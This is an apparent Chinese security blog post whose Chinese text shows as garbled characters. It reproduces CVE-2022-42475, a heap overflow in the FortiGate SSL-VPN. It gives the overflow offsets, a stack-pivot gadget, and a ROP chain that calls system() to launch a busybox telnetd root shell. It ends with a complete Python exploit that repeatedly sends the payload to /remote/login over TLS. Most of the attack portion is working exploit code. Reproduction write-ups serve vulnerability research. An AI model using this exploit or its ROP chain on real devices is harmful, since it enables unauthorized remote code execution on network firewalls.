<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    
    <title>CVE-2022-42475 | ioo0s&#39;s blog</title>

    <meta name="description" content="&lt;p&gt;é¦–å…ˆéœ€è¦è¿›è¡Œç¯å¢ƒæ­å»ºå‚è€ƒ&lt;a href=&#34;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&#34;&gt;è·å– shell è¿›é˜¶&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»¥åŠè°ƒè¯•ç¯å¢ƒæ­å»º &lt;a href=&#34;https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/&#34;&gt;gdb-server é…ç½®&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;a href=&#34;#å¤ç°è¿‡ç¨‹&#34; class=&#34;headerlink&#34; title=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;/a&gt;å¤ç°è¿‡ç¨‹&lt;/h2&gt;&lt;p&gt;æ ¹æ®æ–‡ç«  &lt;a href=&#34;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&#34;&gt;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&lt;/a&gt;ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å¯æ§åˆ¶çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯ä¸åŒç¯å¢ƒçš„åŸå›  è²Œä¼¼æº¢å‡ºç‚¹åœ°å€æœ‰å˜ï¼Œä¾‹å¦‚æˆ‘ init ä¸­åœ¨ &lt;code&gt;0000000001780BFB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è°ƒè¯• exp æ—¶å»ºè®®åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œä¸æ˜¯ç™¾åˆ†ç™¾è§¦å‘è¯¥ä½ç½®ï¼Œå› ä¸ºæœ‰æ—¶ä¼šè¦†ç›–åˆ°å…¶ä»– ç»“æ„ä½ç½® åœ¨èµ‹å€¼æ—¶å¯¼è‡´é”™è¯¯ã€‚&lt;/p&gt;">
    <meta name="keywords" content="">

    

    <meta property="og:locale" content="zh" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content= "CVE-2022-42475 | ioo0s&#39;s blog"  />
    <meta property="og:description" content= "&lt;p&gt;é¦–å…ˆéœ€è¦è¿›è¡Œç¯å¢ƒæ­å»ºå‚è€ƒ&lt;a href=&#34;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&#34;&gt;è·å– shell è¿›é˜¶&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»¥åŠè°ƒè¯•ç¯å¢ƒæ­å»º &lt;a href=&#34;https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/&#34;&gt;gdb-server é…ç½®&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;a href=&#34;#å¤ç°è¿‡ç¨‹&#34; class=&#34;headerlink&#34; title=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;/a&gt;å¤ç°è¿‡ç¨‹&lt;/h2&gt;&lt;p&gt;æ ¹æ®æ–‡ç«  &lt;a href=&#34;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&#34;&gt;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&lt;/a&gt;ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å¯æ§åˆ¶çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯ä¸åŒç¯å¢ƒçš„åŸå›  è²Œä¼¼æº¢å‡ºç‚¹åœ°å€æœ‰å˜ï¼Œä¾‹å¦‚æˆ‘ init ä¸­åœ¨ &lt;code&gt;0000000001780BFB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è°ƒè¯• exp æ—¶å»ºè®®åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œä¸æ˜¯ç™¾åˆ†ç™¾è§¦å‘è¯¥ä½ç½®ï¼Œå› ä¸ºæœ‰æ—¶ä¼šè¦†ç›–åˆ°å…¶ä»– ç»“æ„ä½ç½® åœ¨èµ‹å€¼æ—¶å¯¼è‡´é”™è¯¯ã€‚&lt;/p&gt;" />
    <meta property="og:url" content="http://ioo0s.art/2023/02/09/CVE-2022-42475/index.html" />
    <meta property="og:site_name" content="" />
    <meta property="article:author" content="ios" />
    <meta property="article:publisher" content="" />
    <meta property="og:description" content="&lt;p&gt;é¦–å…ˆéœ€è¦è¿›è¡Œç¯å¢ƒæ­å»ºå‚è€ƒ&lt;a href=&#34;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&#34;&gt;è·å– shell è¿›é˜¶&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»¥åŠè°ƒè¯•ç¯å¢ƒæ­å»º &lt;a href=&#34;https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/&#34;&gt;gdb-server é…ç½®&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;a href=&#34;#å¤ç°è¿‡ç¨‹&#34; class=&#34;headerlink&#34; title=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;/a&gt;å¤ç°è¿‡ç¨‹&lt;/h2&gt;&lt;p&gt;æ ¹æ®æ–‡ç«  &lt;a href=&#34;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&#34;&gt;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&lt;/a&gt;ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å¯æ§åˆ¶çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯ä¸åŒç¯å¢ƒçš„åŸå›  è²Œä¼¼æº¢å‡ºç‚¹åœ°å€æœ‰å˜ï¼Œä¾‹å¦‚æˆ‘ init ä¸­åœ¨ &lt;code&gt;0000000001780BFB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è°ƒè¯• exp æ—¶å»ºè®®åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œä¸æ˜¯ç™¾åˆ†ç™¾è§¦å‘è¯¥ä½ç½®ï¼Œå› ä¸ºæœ‰æ—¶ä¼šè¦†ç›–åˆ°å…¶ä»– ç»“æ„ä½ç½® åœ¨èµ‹å€¼æ—¶å¯¼è‡´é”™è¯¯ã€‚&lt;/p&gt;" />
    <meta name="twitter:title" content="CVE-2022-42475 | ioo0s&#39;s blog"/>
    <meta name="twitter:description" content="&lt;p&gt;é¦–å…ˆéœ€è¦è¿›è¡Œç¯å¢ƒæ­å»ºå‚è€ƒ&lt;a href=&#34;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&#34;&gt;è·å– shell è¿›é˜¶&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»¥åŠè°ƒè¯•ç¯å¢ƒæ­å»º &lt;a href=&#34;https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/&#34;&gt;gdb-server é…ç½®&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;a href=&#34;#å¤ç°è¿‡ç¨‹&#34; class=&#34;headerlink&#34; title=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;/a&gt;å¤ç°è¿‡ç¨‹&lt;/h2&gt;&lt;p&gt;æ ¹æ®æ–‡ç«  &lt;a href=&#34;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&#34;&gt;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&lt;/a&gt;ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å¯æ§åˆ¶çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯ä¸åŒç¯å¢ƒçš„åŸå›  è²Œä¼¼æº¢å‡ºç‚¹åœ°å€æœ‰å˜ï¼Œä¾‹å¦‚æˆ‘ init ä¸­åœ¨ &lt;code&gt;0000000001780BFB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è°ƒè¯• exp æ—¶å»ºè®®åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œä¸æ˜¯ç™¾åˆ†ç™¾è§¦å‘è¯¥ä½ç½®ï¼Œå› ä¸ºæœ‰æ—¶ä¼šè¦†ç›–åˆ°å…¶ä»– ç»“æ„ä½ç½® åœ¨èµ‹å€¼æ—¶å¯¼è‡´é”™è¯¯ã€‚&lt;/p&gt;"/>
    <script type="application/ld+json">
        {
            "description": "&lt;p&gt;é¦–å…ˆéœ€è¦è¿›è¡Œç¯å¢ƒæ­å»ºå‚è€ƒ&lt;a href=&#34;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&#34;&gt;è·å– shell è¿›é˜¶&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»¥åŠè°ƒè¯•ç¯å¢ƒæ­å»º &lt;a href=&#34;https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/&#34;&gt;gdb-server é…ç½®&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;a href=&#34;#å¤ç°è¿‡ç¨‹&#34; class=&#34;headerlink&#34; title=&#34;å¤ç°è¿‡ç¨‹&#34;&gt;&lt;/a&gt;å¤ç°è¿‡ç¨‹&lt;/h2&gt;&lt;p&gt;æ ¹æ®æ–‡ç«  &lt;a href=&#34;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&#34;&gt;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&lt;/a&gt;ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å¯æ§åˆ¶çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯ä¸åŒç¯å¢ƒçš„åŸå›  è²Œä¼¼æº¢å‡ºç‚¹åœ°å€æœ‰å˜ï¼Œä¾‹å¦‚æˆ‘ init ä¸­åœ¨ &lt;code&gt;0000000001780BFB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è°ƒè¯• exp æ—¶å»ºè®®åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œä¸æ˜¯ç™¾åˆ†ç™¾è§¦å‘è¯¥ä½ç½®ï¼Œå› ä¸ºæœ‰æ—¶ä¼šè¦†ç›–åˆ°å…¶ä»– ç»“æ„ä½ç½® åœ¨èµ‹å€¼æ—¶å¯¼è‡´é”™è¯¯ã€‚&lt;/p&gt;",
            "author": { "@type": "Person", "name": "ios" },
            "@type": "BlogPosting",
            "url": "http://ioo0s.art/2023/02/09/CVE-2022-42475/index.html",
            "publisher": {
            "@type": "Organization",
            "logo": {
                "@type": "ImageObject",
                "url": "http://ioo0s.art/images/avatar.jpg"
            },
            "name": "ios"
            },
            "headline": "CVE-2022-42475 | ioo0s&#39;s blog",
            "datePublished": "2023-02-09T03:24:40.000Z",
            "mainEntityOfPage": {
                "@type": "WebPage",
                "@id": "http://ioo0s.art/2023/02/09/CVE-2022-42475/index.html"
            },
            "@context": "http://schema.org"
        }
    </script>




    

    

    

    

    
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ğŸ¦ˆ</text></svg>">
    

    

    

    
<link rel="stylesheet" href="/dist/build.css?v=1654266144177.css">


    
<link rel="stylesheet" href="/dist/custom.css?v=1654266144177.css">


    <script>
        window.isPost = true
        window.aomori = {
            
            
            
        }
        window.aomori_logo_typed_animated = true
        window.aomori_search_algolia = false

    </script>

<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="ioo0s's blog" type="application/atom+xml">
</head>

<body>

    <div class="container">
    <header class="header">
        <div class="header-type">
            
            <div class="header-type-avatar avatar avatar-sm">
                <img src="/images/avatar.jpg" alt="ios">
            </div>
            
            <div class="header-type-inner">
                
                    <div id="typed-strings" style="display:none">
                        <p>ioo0s&#39;s blog</p>
                    </div>
                    <a class="header-type-title" id="typed" href="/"></a>
                
    
                
            </div>
        </div>
        <div class="header-menu">
            <div class="header-menu-inner">
                
                <a href="/">ä¸»é¡µ</a>
                
                <a href="/archives">å­˜æ¡£</a>
                
                <a href="/collection">æ”¶è—</a>
                
            </div>
            <div class="header-menu-social">
                
    <a class="social" target="_blank" href="https://github.com/ioo0s">
        <ion-icon name="logo-github"></ion-icon>
    </a>

    <a class="social" target="_blank" href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=2417117320&website=www.oicqzone.com">
        <ion-icon name="logo-tux"></ion-icon>
    </a>

    <a class="social" target="_blank" href="http://ioo0s.art/atom.xml">
        <ion-icon name="logo-rss"></ion-icon>
    </a>

            </div>
        </div>

        <div class="header-menu-mobile">
            <div class="header-menu-mobile-inner" id="mobile-menu-open">
                <i class="icon icon-menu"></i>
            </div>
        </div>
    </header>

    <div class="header-menu-mobile-menu">
        <div class="header-menu-mobile-menu-bg"></div>
        <div class="header-menu-mobile-menu-wrap">
            <div class="header-menu-mobile-menu-inner">
                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
                    <i class="icon icon-cross"></i>
                </div>
                <div class="header-menu-mobile-menu-list">
                    
                    <a href="/">ä¸»é¡µ</a>
                    
                    <a href="/archives">å­˜æ¡£</a>
                    
                    <a href="/collection">æ”¶è—</a>
                    
                </div>
            </div>
        </div>
    </div>

</div>

    <div class="container">
        <div class="main">
            <section class="inner">
                <section class="inner-main">
                    <div class="post">
    <article id="post-clec5f5ov0001ksv00tw47xx8" class="article article-type-post" itemscope
    itemprop="blogPost">

    <div class="article-inner">

        
          
        
        
        

        
        <header class="article-header">
            
  
    <h1 class="article-title" itemprop="name">
      CVE-2022-42475
    </h1>
  

        </header>
        

        <div class="article-more-info article-more-info-post hairline">

            <div class="article-date">
  <time datetime="2023-02-09T03:24:40.000Z" itemprop="datePublished">2023-02-09</time>
</div>

            
            <div class="article-category">
                <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">æ¼æ´æŒ–æ˜</a>
            </div>
            

            
            <div class="article-tag">
                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FortiGate/" rel="tag">FortiGate</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">æ¼æ´å¤ç°</a></li></ul>
            </div>
            

            
            <div class="article-busuanzi">
                <span id="busuanzi_value_page_pv">N</span> äººçœ‹è¿‡
            </div>
            

        </div>

        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
            <p>é¦–å…ˆéœ€è¦è¿›è¡Œç¯å¢ƒæ­å»ºå‚è€ƒ<a href="https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/">è·å– shell è¿›é˜¶</a></p>
<p>ä»¥åŠè°ƒè¯•ç¯å¢ƒæ­å»º <a href="https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/">gdb-server é…ç½®</a></p>
<h2 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h2><p>æ ¹æ®æ–‡ç«  <a target="_blank" rel="noopener" href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">https://wzt.ac.cn/2022/12/15/CVE-2022-42475/</a>ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å¯æ§åˆ¶çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯ä¸åŒç¯å¢ƒçš„åŸå›  è²Œä¼¼æº¢å‡ºç‚¹åœ°å€æœ‰å˜ï¼Œä¾‹å¦‚æˆ‘ init ä¸­åœ¨ <code>0000000001780BFB</code></p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png"></p>
<p>è°ƒè¯• exp æ—¶å»ºè®®åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œä¸æ˜¯ç™¾åˆ†ç™¾è§¦å‘è¯¥ä½ç½®ï¼Œå› ä¸ºæœ‰æ—¶ä¼šè¦†ç›–åˆ°å…¶ä»– ç»“æ„ä½ç½® åœ¨èµ‹å€¼æ—¶å¯¼è‡´é”™è¯¯ã€‚</p>
<span id="more"></span>

<ol>
<li>ç¡®å®šæº¢å‡ºåç§»</li>
</ol>
<p>ä¸ºäº†å¿«é€Ÿç¡®å®šåç§»ï¼Œè¿™é‡Œå»ºè®®ç”¨ peda çš„ pattern ç”Ÿæˆ Payload è¿›è¡Œè§¦å‘</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcntv3SPMSPz4RcHJJPCKzQZb.png"></p>
<p>æ¥ç€å½“æ–­ç‚¹è§¦å‘åœ¨ jmp rax çš„æ—¶å€™ï¼ŒæŸ¥çœ‹å½“å‰ rax çš„å€¼è®¡ç®— offsetï¼Œé€šè¿‡å¤§é‡æµ‹è¯•åŸºæœ¬ä¼šå­˜åœ¨ä¸¤ç§æƒ…å†µåç§»ä¼šè§¦å‘åˆ° jmp raxï¼Œ</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnHQAyBPb7XieHeSWb6b8W0d.png"></p>
<p>åˆ†åˆ«æ˜¯ 2592,1568ï¼Œå¹¶ä¸” 2592 åç§»è§¦å‘å‡ ç‡å¤§äº 1568ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„ exp æ„é€ å‡åœ¨ 2592 å¤„ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ 2592+payload æ¥æ§åˆ¶è·³è½¬äº†</p>
<ol>
<li>æ ˆè¿ç§»</li>
</ol>
<p>ç”±äºæ­¤æ—¶æ˜¯å †æº¢å‡ºï¼Œåªèƒ½æ§åˆ¶ä¸€æ¬¡è·³è½¬ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨æ ˆè¿ç§»å°†æ ˆåœ°å€ç§»åŠ¨åˆ°æˆ‘ä»¬å¯æ§çš„ä½ç½®ï¼Œé€šè¿‡å¯„å­˜å™¨ä¿¡æ¯å¯ä»¥çŸ¥é“ç›®å‰è¢«æº¢å‡ºçš„ä½ç½®æœ‰ä»¥ä¸‹å‡ ä¸ªå¯„å­˜å™¨ï¼ŒRAX ç”¨æ¥æ ˆè¿ç§»ï¼ŒRDX å¯æ§ï¼Œå†…å®¹æ˜¯æº¢å‡ºçš„å­—ç¬¦ï¼ˆæˆªå›¾æ˜¯ exp æ„é€ åçš„ï¼‰ï¼ŒR11 å¯æ§ï¼Œå†…å®¹æ˜¯æº¢å‡ºå­—ç¬¦ã€‚</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcniOyqoX4kN3oYHpK17GwApf.png"></p>
<p>æ‰€ä»¥æˆ‘ä»¬ç›®æ ‡æ˜¯æ‰¾åˆ°ç±»ä¼¼ push RDXï¼Œpop rsp æˆ– push r11ï¼Œpop rsp çš„ gadgetã€‚æ¥ç€é€šè¿‡ ropgadget ç”Ÿæˆæ‰€æœ‰çš„ gadget å¹¶è¾“å‡ºåˆ°æ–‡æœ¬ï¼ˆä½ é—®æˆ‘ä¸ºå•¥ä¸ç›´æ¥æŸ¥æ‰¾ï¼Ÿå¡åˆ°çˆ†ï¼ï¼ï¼ï¼‰</p>
<p>æ¥ç€åˆ©ç”¨å‘½ä»¤å…³è”æœç´¢ <code>cat gadget.txt| grep &quot;push rdx&quot;| grep &quot;pop rsp&quot;</code></p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnTPsrxcyBOGd3IJeKFUVvMd.png"></p>
<p>å‘ç°æœ‰ä¸€ä¸ªæ¯”è¾ƒç¬¦åˆçš„ <code>0x000000000140583a : push rdx ; pop rsp ; add edi, edi ; nop ; ret</code></p>
<p>æ¥ç€æˆ‘ä»¬å°±èƒ½å°†æ ˆè¿ç§»åˆ°åˆ° rdx æ‰€æŒ‡çš„å†…å­˜å¤„äº†</p>
<ol>
<li>è®¡ç®— rdx å¯æ§åç§»</li>
</ol>
<p>é‚£æ­¤å¤„è®¡ç®—æ–¹å¼å°±å’Œä¸Šæ–¹ä¸€è‡´äº†ï¼Œé€šè¿‡å†æ¬¡åˆ©ç”¨ pattern è¿›è¡Œæº¢å‡ºï¼Œå¹¶è®¡ç®— rdx å¤„çš„åç§»ï¼Œé€šè¿‡è®¡ç®—å¾—åˆ°åç§»ä¸º 2400</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcn4hNGUQXG3rPlMPHmrIc9Se.png"></p>
<ol>
<li>æ„é€  exp</li>
</ol>
<p>æ­¤æ—¶ rdx å†…å­˜å¤„å¯æ§ï¼Œæ­£å¼å¼€å§‹æ„é€  expï¼Œç›®å‰çš„ exp æ˜¯åŸºäº busybox çš„ï¼Œä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ expï¼Œä½†æ˜¯ä¹Ÿæ˜¯ä¸€æ ·çš„è¯æ˜äº†å¯ä»¥ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<pre><code>gadget1 = 0x000000000140583a #
        payload = b&quot;B&quot;*2400
        #payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # : pop rax ; ret
        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret
        payload += int_to_bytes(0x58) + b&quot;\x00&quot;*7 # sell offset
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 #push rdx; pop rdi; ret;
        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5# : pop rsi ; ret
        payload += b&quot;\x00&quot;*8 # sell offset 0
        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5# : pop rdx ; ret
        payload += b&quot;\x00&quot;*8 # sell offset 0
        payload += int_to_bytes(0x5693D5) + b&quot;\x00&quot;*5 # call system
        payload += b&quot;/bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;+b&quot;\x00&quot;*8
        raw = payload+b&quot;A&quot;*(2592-len(payload))
        raw += int_to_bytes(gadget1)
</code></pre>
<p>ç®€å•è®²è§£ä¸€ä¸‹ payloadï¼Œé¦–å…ˆæ˜¯ pop rax ç”¨å¤„æ˜¯ å­˜æ”¾è·ç¦»å‘½ä»¤å­—ç¬¦ä¸²çš„åç§»é‡ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡è°ƒè¯•ä¹Ÿèƒ½å¾—åˆ°ã€‚</p>
<p>è¿™é‡Œç”±äºè°ƒè¯•æ—¶å‘ç°ä¼šåœ¨æ ˆä¸­å¤šå‡ºä¸ª 1 å¯¼è‡´ pop raxï¼›ret åæ‰§è¡Œåœ°å€ 1 å‡ºç°é”™è¯¯ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸€ä¸ª pop rax åæ—© pop æŸä¸ªå¯„å­˜å™¨è®©è¿™ä¸ª 1 å‡ºæ ˆï¼Œæœ€ç»ˆæ‰¾åˆ°äº† pop rax ; pop rcx ; retï¼Œä¸ä¼šå½±å“å…¶ä»– gadgetã€‚</p>
<p>æ¥ç€è°ƒè¯•æ—¶å‘ç°äº†ä¸€äº›æ ˆä¸å¹³è¡¡çš„é—®é¢˜ï¼Œåˆ©ç”¨ä¸€äº› junk gadget ç”¨æ¥è¡¥é½æ ˆ</p>
<p>æ¥ç€ add rdx, rax å¾—åˆ°å‘½ä»¤å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå¹¶å­˜åœ¨ rdx ä¸­</p>
<p>æœ€åæ„é€  system(cmd,0,0);è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œæ³¨æ„éœ€è¦æ§åˆ¶çš„ä¸‰ä¸ªå¯„å­˜å™¨ rdiã€rsiã€rdx</p>
<p>æŸ¥çœ‹ä¸€ä¸‹æ„é€  system å‰çš„å¯„å­˜å™¨å’Œæ ˆç©ºé—´</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnHOcQXZ6bFQlNt1BR523wuf.png"></p>
<ol>
<li>å¤šæ¬¡å‘é€ payload åä¼šå¤šå‡ºä¸€ä¸ªè¿›ç¨‹å¼€åœ¨ 22 ç«¯å£ï¼Œé€šè¿‡ telnet è¿æ¥ä¸Šå»æˆåŠŸè·å¾— shell</li>
</ol>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcn8zAekllzjKNxyc7nZH4fhh.png"></p>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><pre><code>import socket
import ssl
from struct import pack

def int_to_bytes(n, minlen=0):
    &quot;&quot;&quot; Convert integer to bytearray with optional minimum length. 
    &quot;&quot;&quot;
    if n &gt; 0:
        arr = []
        while n:
            n, rem = n &gt;&gt; 8, n &amp; 0xff
            arr.append(rem)
        b = bytearray(arr)
    elif n == 0:
        b = bytearray(b&#39;\x00&#39;)
    else:
        raise ValueError(&#39;Only non-negative values supported&#39;)

    if minlen &gt; 0 and len(b) &lt; minlen: # zero padding needed?
        b = (minlen-len(b)) * &#39;\x00&#39; + b
    return b
path = &quot;/remote/login&quot;.encode()
id = 0
while True:
    print(&quot;#&quot;+str(id))
    #access mem addr 0x164e000 - 0x17a1fff
    CL=0x1b00000000
    # push rdx ; pop rsp ; add edi, edi ; nop ; ret
    gadget1 = 0x000000000140583a

    try:
        payload = b&quot;B&quot;*2400
        #payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # : pop rax ; ret
        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret
        payload += int_to_bytes(0x58) + b&quot;\x00&quot;*7 # sell offset
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 #push rdx; pop rdi; ret;
        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5# : pop rsi ; ret
        payload += b&quot;\x00&quot;*8 # sell offset 0
        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5# : pop rdx ; ret
        payload += b&quot;\x00&quot;*8 # sell offset 0
        payload += int_to_bytes(0x5693D5) + b&quot;\x00&quot;*5 # call system
        payload += b&quot;/bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;+b&quot;\x00&quot;*8
        raw = payload+b&quot;A&quot;*(2592-len(payload))
        raw += int_to_bytes(gadget1)
        #raw += int_to_bytes(gadget2)
        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.connect((&quot;192.168.109.111&quot;, 4443))
        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        _socket = _default_context.wrap_socket(_socket)
        _socket.sendall(data)
        sleep(1)
        _socket.sendall(b&#39;ls&#39;)
        res = _socket.recv(1024)
        print(res)
          
        #res = _socket.recv(1024)
        #if b&quot;HTTP/1.1&quot; not in res:
        #    print(&quot;Error detected&quot;)
        #    print(CL)
        #    continue
    except Exception as e:
        pass
    id+=1
</code></pre>
